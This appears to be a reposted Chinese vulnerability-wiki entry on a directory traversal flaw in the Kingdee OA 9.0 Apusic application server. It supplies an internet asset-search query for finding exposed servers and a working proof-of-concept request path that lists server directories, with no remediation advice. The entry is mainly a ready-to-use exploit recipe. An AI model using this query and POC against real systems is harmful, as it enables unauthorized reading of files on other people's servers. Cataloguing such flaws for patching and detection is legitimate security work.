---
title: "金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞"
date: 2026-10-17 09:13:51
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "金蝶OA"
tags:
  - "金蝶OA"
  - "任意文件读取"
  - "目录遍历"
  - "漏洞复现"
---
## 漏洞描述

金蝶OA Apusic应用服务器(中间件) 存在任意文件读取漏洞，攻击者通过漏洞可以获取目录下的文件信息

## 漏洞影响

```
金蝶OA 9.0 Apusic应用服务器(中间件)
```

## 网络测绘

```
app="Apusic-公司产品" && title=="欢迎使用Apusic应用服务器"
```

## 漏洞复现

登录页面

![image-20220520142557418](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201425611.png)

验证POC

```
/admin/protected/selector/server_file/files?folder=/
```

![image-20220520142704544](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201427636.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%87%91%E8%9D%B6OA-Apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%28%E4%B8%AD%E9%97%B4%E4%BB%B6%29-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md)
